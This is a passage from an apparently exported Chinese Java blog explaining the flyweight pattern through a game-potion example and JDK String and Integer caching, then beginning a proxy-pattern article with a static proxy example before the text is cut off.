title=\"享元模式\"></a>享元模式</h3><blockquote>\n<p>定义：运用共享技术有效地支持大量细粒度对象的复用。系统只使用少量的对象，而这些对象都很相似，状态变化很小，可以实现对象的多次复用。由于享元模式要求能够共享的对象必须是细粒度对象，因此它又称为轻量级模式，它是一种对象结构型模式。</p>\n</blockquote>\n<p>享元模式以共享的方式高效地支持大量细粒度对象的重用，享元对象能做到共享的关键是区分了内部状态(Intrinsic State)和外部状态(Extrinsic State)。</p>\n<ul>\n<li>内部状态：内部状态是存储在享元对象内部并且不会随环境改变而改变的状态，内部状态可以共享。</li>\n<li>外部状态是随环境改变而改变的、不可以共享的状态。享元对象的外部状态通常由客户端保存，并在享元对象被创建之后，需要使用的时候再传入到享元对象内部。一个外部状态与另一个外部状态之间是相互独立的。</li>\n</ul>\n<p>正因为区分了内部状态和外部状态，我们可以将具有相同内部状态的对象存储在享元池中，享元池中的对象是可以实现共享的，需要的时候就将对象从享元池中取出，实现对象的复用。通过向取出的对象注入不同的外部状态，可以得到一系列相似的对象，而这些对象在内存中实际上只存储一份。</p>\n<span id=\"more\"></span>\n<p>享元模式UML如图：<br><img src=\"/images/old/20171017%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-17%E4%B8%8B%E5%8D%883.41.00.png\"></p>\n<ul>\n<li>抽象享元（AbstractFlyweight）:通常是一个接口或抽象类，在抽象享元类中声明了具体享元类公共的方法，这些方法可以向外界提供享元对象的内部数据（内部状态），同时也可以通过这些方法来设置外部数据（外部状态）。</li>\n<li>具体享元（ConcreteFlyweight）：它实现了抽象享元类，其实例称为享元对象；在具体享元类中为内部状态提供了存储空间。</li>\n<li>非共享具体享元类(UnsharedConcreteFlyweight)：并不是所有的抽象享元类的子类都需要被共享，不能被共享的子类可设计为非共享具体享元类；当需要一个非共享具体享元类的对象时可以直接通过实例化创建。</li>\n<li>享元工厂（FlyweightFactory）：享元工厂类用于创建并管理享元对象，它针对抽象享元类编程，将各种类型的具体享元对象存储在一个享元池中，享元池一般设计为一个存储“键值对”的集合（也可以是其他类型的集合）。</li>\n</ul>\n<p>举例，在游戏中，有恢复药剂，分为HP恢复药剂以及MP恢复药剂，在没捡到一份药剂后，如果每次都创建一个药剂对象，会比较浪费系统资源，这个时候可以采用享元模式来设计：<br><img src=\"/images/old/20171017%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-17%E4%B8%8B%E5%8D%883.33.44.png\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 药水</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AbstractPotion</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 药品名称</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> String name;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">AbstractPotion</span><span class=\"params\">(String name)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 使用药水</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">abstract</span> <span class=\"keyword\">void</span> <span class=\"title function_\">operation</span><span class=\"params\">()</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">getName</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 生命药剂</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">HealingPotion</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractPotion</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">HealingPotion</span><span class=\"params\">(String name)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">operation</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;使用&quot;</span> + name + <span class=\"string\">&quot;：你的HP恢复了&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 魔法药剂</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">MagicPotion</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractPotion</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">MagicPotion</span><span class=\"params\">(String name)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">operation</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;使用&quot;</span> + name + <span class=\"string\">&quot;：你的MP恢复了&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 药水工厂</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">PotionFactory</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"title function_\">PotionFactory</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 工厂药品存放</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Map&lt;String, AbstractPotion&gt; potionMap = <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">static</span> <span class=\"type\">Object</span> <span class=\"variable\">potionBuild</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 药水类型</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">enum</span> <span class=\"title class_\">PotionTypeEnum</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//HP药剂</span></span><br><span class=\"line\">        HEALING_POTION,</span><br><span class=\"line\">        <span class=\"comment\">//HP药剂</span></span><br><span class=\"line\">        MAGIC_POTION</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 创建药品</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> potionType</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> name</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> AbstractPotion <span class=\"title function_\">buildPotion</span><span class=\"params\">(PotionTypeEnum potionType, String name)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">AbstractPotion</span> <span class=\"variable\">potion</span> <span class=\"operator\">=</span> potionMap.get(potionType.name() + <span class=\"string\">&quot;_&quot;</span> + name);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (potion == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">synchronized</span> (potionMap) &#123;</span><br><span class=\"line\">                potion = potionMap.get(potionType.name() + <span class=\"string\">&quot;_&quot;</span> + name);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (potion == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">switch</span> (potionType) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">case</span> HEALING_POTION:</span><br><span class=\"line\">                            potion = <span class=\"keyword\">new</span> <span class=\"title class_\">HealingPotion</span>(name);</span><br><span class=\"line\">                            potionMap.put(potionType.name() + <span class=\"string\">&quot;_&quot;</span> + name, potion);</span><br><span class=\"line\">                            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                        <span class=\"keyword\">case</span> MAGIC_POTION:</span><br><span class=\"line\">                            potion = <span class=\"keyword\">new</span> <span class=\"title class_\">MagicPotion</span>(name);</span><br><span class=\"line\">                            potionMap.put(potionType.name() + <span class=\"string\">&quot;_&quot;</span> + name, potion);</span><br><span class=\"line\">                            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> potion;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">AbstractPotion</span> <span class=\"variable\">hp1</span> <span class=\"operator\">=</span> PotionFactory.buildPotion(PotionFactory.PotionTypeEnum.HEALING_POTION, <span class=\"string\">&quot;小型HP恢复药剂&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">AbstractPotion</span> <span class=\"variable\">hp2</span> <span class=\"operator\">=</span> PotionFactory.buildPotion(PotionFactory.PotionTypeEnum.HEALING_POTION, <span class=\"string\">&quot;大型HP恢复药剂&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">AbstractPotion</span> <span class=\"variable\">hp3</span> <span class=\"operator\">=</span> PotionFactory.buildPotion(PotionFactory.PotionTypeEnum.HEALING_POTION, <span class=\"string\">&quot;小型HP恢复药剂&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">AbstractPotion</span> <span class=\"variable\">mp1</span> <span class=\"operator\">=</span> PotionFactory.buildPotion(PotionFactory.PotionTypeEnum.HEALING_POTION, <span class=\"string\">&quot;大型MP恢复药剂&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">AbstractPotion</span> <span class=\"variable\">mp2</span> <span class=\"operator\">=</span> PotionFactory.buildPotion(PotionFactory.PotionTypeEnum.HEALING_POTION, <span class=\"string\">&quot;小型MP恢复药剂&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">AbstractPotion</span> <span class=\"variable\">mp3</span> <span class=\"operator\">=</span> PotionFactory.buildPotion(PotionFactory.PotionTypeEnum.HEALING_POTION, <span class=\"string\">&quot;大型MP恢复药剂&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(System.identityHashCode(hp1));</span><br><span class=\"line\">        System.out.println(System.identityHashCode(hp2));</span><br><span class=\"line\">        System.out.println(System.identityHashCode(hp3));</span><br><span class=\"line\">        System.out.println(System.identityHashCode(mp1));</span><br><span class=\"line\">        System.out.println(System.identityHashCode(mp2));</span><br><span class=\"line\">        System.out.println(System.identityHashCode(mp3));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在该例子中，提供工厂车间对象后，如果是同种药剂，返回的是同一个对象。非共享具体享元类，这里不做展示，和平常创建对象是一样的。</p>\n<h3 id=\"单纯享元模式、复合享元模式\"><a href=\"#单纯享元模式、复合享元模式\" class=\"headerlink\" title=\"单纯享元模式、复合享元模式\"></a>单纯享元模式、复合享元模式</h3><ul>\n<li>在单纯享元模式中，所有的具体享元类都是可以共享的，不存在非共享具体享元类。（如上面例子）</li>\n<li>将一些单纯享元对象使用组合模式加以组合，还可以形成复合享元对象，这样的复合享元对象本身不能共享，但是它们可以分解成单纯享元对象，而后者则可以共享。</li>\n</ul>\n<p>复合享元模式例子：还是之前的系统，现在有个药剂师副业，可以生产出极度稀有的自定义药剂（这里只是举例理解复合享元模式，实际应用中应该不存在），系统能出产改药剂的人非常少。这时需要在系统中新增一个特殊药剂类：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 特殊药剂</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">SpecialPotion</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractPotion</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//药剂效果</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> List&lt;AbstractPotion&gt; effect = <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">SpecialPotion</span><span class=\"params\">(String name)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">SpecialPotion</span><span class=\"params\">(String name, List&lt;AbstractPotion&gt; effect)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(name);</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.effect = effect;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">operation</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        effect.forEach(AbstractPotion::operation);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        ArrayList&lt;AbstractPotion&gt; potionArrayList = <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;&gt;();</span><br><span class=\"line\">        potionArrayList.add(PotionFactory.buildPotion(PotionFactory.PotionTypeEnum.HEALING_POTION, <span class=\"string\">&quot;小型HP药剂&quot;</span>));</span><br><span class=\"line\">        potionArrayList.add(PotionFactory.buildPotion(PotionFactory.PotionTypeEnum.HEALING_POTION, <span class=\"string\">&quot;小型MP药剂&quot;</span>));</span><br><span class=\"line\">        <span class=\"type\">SpecialPotion</span> <span class=\"variable\">specialPotion</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SpecialPotion</span>(<span class=\"string\">&quot;特殊药剂&quot;</span>, potionArrayList);</span><br><span class=\"line\">        specialPotion.operation();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>UML类图如下：<br><img src=\"/images/old/20171017%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-17%E4%B8%8B%E5%8D%884.06.40.png\"></p>\n<p>新增的特殊药剂，有着同时恢复HP和MP功效，其内部属性effect集合中数据时共享的，由Factory创建。</p>\n<h3 id=\"在JDK中使用\"><a href=\"#在JDK中使用\" class=\"headerlink\" title=\"在JDK中使用\"></a>在JDK中使用</h3><p>在String和Integer等类中有使用享元模式。<br>先说String：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">str1</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;abcd&quot;</span>;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">str2</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;abcd&quot;</span>;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">str3</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;ab&quot;</span> + <span class=\"string\">&quot;cd&quot;</span>;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">str4</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;ab&quot;</span>;</span><br><span class=\"line\">        str4 += <span class=\"string\">&quot;cd&quot;</span>;</span><br><span class=\"line\">        System.out.println(System.identityHashCode(str1));<span class=\"comment\">//1160460865</span></span><br><span class=\"line\">        System.out.println(System.identityHashCode(str2));<span class=\"comment\">//1160460865</span></span><br><span class=\"line\">        System.out.println(System.identityHashCode(str3));<span class=\"comment\">//1160460865</span></span><br><span class=\"line\">        System.out.println(System.identityHashCode(str4));<span class=\"comment\">//1247233941</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在Java中字符串被大量使用，为了避免每次都创建相同的字符串对象及内存分配，JVM内部对字符串对象的创建做了一定的优化，在内存中专门有一块区域用来存储字符串常量池。在第一次创建字符串”abcd”，会把该字符串对象放入常量池，第二次创建时，直接从常量池中获取改字符串。第三个在编译期间就会把改字符串合并为”abcd”所以是一样的，第四个，在实际运行中是通过StringBuilder来拼接的字符串之后toString返回。</p>\n<ul>\n<li>注：在JDK1.7中, 已经把原本放在永久代的字符串常量池移出, 放在堆中。JDK 1.8 对 JVM 架构的改造将类元数据放到本地内存中。另外。将常量池和静态变量放到 Java 堆里。在这样的架构下。类元信息就突破了原来 -XX:MaxPermSize 的限制。如今能够使用很多其它的本地内存。这样就从一定程度上攻克了原来在执行时生成大量类的造成常常 Full GC 问题，如执行时使用反射、代理等。</li>\n<li>注：除了字面常量值以外，常量池还可以容纳其它几种符号引用：类和接口的全限定名、字段名称和描述符、方法名称和描述符。</li>\n</ul>\n<p>举例Integer：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Integer</span> <span class=\"variable\">int1</span> <span class=\"operator\">=</span> <span class=\"number\">1</span>;<span class=\"comment\">//自动装箱相当于Integer.valueOf(1)</span></span><br><span class=\"line\">        <span class=\"type\">Integer</span> <span class=\"variable\">int2</span> <span class=\"operator\">=</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"type\">Integer</span> <span class=\"variable\">int3</span> <span class=\"operator\">=</span> <span class=\"number\">200</span>;</span><br><span class=\"line\">        <span class=\"type\">Integer</span> <span class=\"variable\">int4</span> <span class=\"operator\">=</span> <span class=\"number\">200</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">i1</span> <span class=\"operator\">=</span> <span class=\"number\">200</span>;</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">i2</span> <span class=\"operator\">=</span> <span class=\"number\">200</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(int1 == int2);<span class=\"comment\">//true</span></span><br><span class=\"line\">        System.out.println(int3 == int4);<span class=\"comment\">//false</span></span><br><span class=\"line\">        System.out.println(i1 == i2);<span class=\"comment\">//true</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在代码中int比较为true是因为int是基本类型，直接比较的值。两个Integer中比较一个为true，一个为false，查看源码得知，是因为Integer中使用了享元模式，在Integer中有个缓存池，保存了-128~127之间所有的Integer。</p>\n<p>同样在项目中线程池、连接池等，都使用享元模式。</p>\n<h3 id=\"享元模式总结\"><a href=\"#享元模式总结\" class=\"headerlink\" title=\"享元模式总结\"></a>享元模式总结</h3><p>享元模式是以节约内存、提高性能为出发点的设计模式。当系统中存在大量相同或者相似的对象时，享元模式是一种较好的解决方案，它通过共享技术实现相同或相似的细粒度对象的复用，从而节约了内存空间，提高了系统性能。相比其他结构型设计模式，享元模式的使用频率并不算太高。</p>\n<p>享元模式和工厂模式区别在于，享元模式是内部使用了工厂模式来创建对象，是包含关系。<br>享元模式和单例模式区别在于，享元模式创建的对象在系统中并不是唯一存在，只是相似对象是唯一存在。而单例是类基本唯一存在，有且只有一个。相同点在于都能节约内存。</p>\n<p><strong>使用场景：</strong></p>\n<ul>\n<li>一个系统有大量相同或者相似的对象，造成内存的大量耗费。</li>\n<li>对象的大部分状态都可以外部化，可以将这些外部状态传入对象中。（如药剂名字）</li>\n<li>在使用享元模式时需要维护一个存储享元对象的享元池，而这需要耗费一定的系统资源，因此，应当在需要多次重复使用享元对象时才值得使用享元模式。</li>\n</ul>\n<p><strong>优点：</strong></p>\n<ul>\n<li>可以极大减少内存中对象的数量，使得相同或相似对象在内存中只保存一份，从而可以节约系统资源，提高系统性能。</li>\n</ul>\n<p><strong>缺点：</strong></p>\n<ul>\n<li>享元模式使得系统变得复杂，需要分离出内部状态和外部状态，这使得程序的逻辑复杂化。</li>\n<li>为了使对象可以共享，享元模式需要将享元对象的部分状态外部化，而读取外部状态将使得运行时间变长。</li>\n</ul>\n","categories":["设计模式"],"tags":["设计模式","享元模式","Flyweight Pattern"]},{"title":"Java设计模式-代理模式（Proxy-Pattern）","url":"/2017/10/18/Java%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F%EF%BC%88Proxy-Pattern%EF%BC%89/","content":"<h3 id=\"代理模式\"><a href=\"#代理模式\" class=\"headerlink\" title=\"代理模式\"></a>代理模式</h3><blockquote>\n<p>给某一个对象提供一个代理或占位符，并由代理对象来控制对原对象的访问。</p>\n</blockquote>\n<p>代理模式简单UML如下：<br><img src=\"/images/old/20171018%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-18%E4%B8%8A%E5%8D%889.43.05.png\"><span id=\"more\"></span></p>\n<ul>\n<li>接口：它声明了其实现和代理的共同接口，这样一来在任何使用其实现类的地方都可以使用代理类，客户端通常需要针对接口进行编程（cglib例外）。</li>\n<li>代理（proxy）：它包含了对实现类的引用，从而可以在任何时候操作实现类对象；在代理类中提供一个与实现类角色相同的接口，以便在任何时候都可以替代接口实现类；代理类还可以控制对实现类的使用，负责在需要的时候创建和删除实现类对象，并对实现类对象的使用加以约束。通常，在代理类中，客户端在调用所引用的实现类操作之前或之后还需要执行其他操作，而不仅仅是单纯调用实现类对象中的操作。</li>\n<li>实现类：接口的具体实现，定义了客户端真实方法。</li>\n</ul>\n<p>代理模式是常用的结构型设计模式之一，当无法直接访问某个对象或访问某个对象存在困难时可以通过一个代理对象来间接访问，为了保证客户端使用的透明性，所访问的真实对象与代理对象需要实现相同的接口。根据代理模式的使用目的不同，代理模式又可以分为多种类型，例如保护代理、远程代理、虚拟代理、缓冲代理等，它们应用于不同的场合，满足用户的不同需求。代理的实现又分为静态代理、动态代理。</p>\n<ul>\n<li>远程代理(Remote Proxy)：为一个位于不同的地址空间的对象提供一个本地的代理对象，这个不同的地址空间可以是在同一台主机中，也可是在另一台主机中，远程代理又称为大使(Ambassador)。（如：SOA、Web Service）</li>\n<li>虚拟代理(Virtual Proxy)：如果需要创建一个资源消耗较大的对象，先创建一个消耗相对较小的对象来表示，真实对象只在需要时才会被真正创建。</li>\n<li>保护代理(Protect Proxy)：控制对一个对象的访问，可以给不同的用户提供不同级别的使用权限。</li>\n<li>缓冲代理(Cache Proxy)：为某一个目标操作的结果提供临时的存储空间，以便多个客户端可以共享这些结果。</li>\n<li>智能引用代理(Smart Reference Proxy)：当一个对象被引用时，提供一些额外的操作，例如将对象被调用的次数记录下来等。</li>\n</ul>\n<h3 id=\"静态代理、动态代理\"><a href=\"#静态代理、动态代理\" class=\"headerlink\" title=\"静态代理、动态代理\"></a>静态代理、动态代理</h3><p>代理的实现分为静态代理、动态代理：</p>\n<ul>\n<li>静态代理：由开发人员创建或工具生成代理类的源码，再编译代理类。所谓静态也就是在程序运行前就已经存在代理类的字节码文件，代理类和委托类的关系在运行前就确定了。</li>\n<li>动态代理类的源码是在程序运行期间由JVM根据反射等机制动态的生成，所以不存在代理类的字节码文件。代理类和委托类的关系是在程序运行时确定。</li>\n</ul>\n<p>静态代理：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 接口</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">ITarget</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">operation</span><span class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 目标类</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Target</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">ITarget</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">operation</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;天气真好&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 代理类</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Proxy</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">ITarget</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> ITarget target;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Proxy</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.target = <span class=\"keyword\">new</span> <span class=\"title class_\">Target</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">operation</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;记录日志：开始调用目标方法Target.operation&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">long</span> <span class=\"variable\">start</span> <span class=\"operator\">=</span> System.currentTimeMillis();</span><br><span class=\"line\">        target.operation();</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;记录日志：目标方法Target.operation调用结束。耗时：&quot;</span> + (System.currentTimeMillis() - start));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">ITarget</span> <span class=\"variable\">target</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Proxy</span>();</span><br><span class=\"line\">        target.operation();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>JDK动态代理：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span 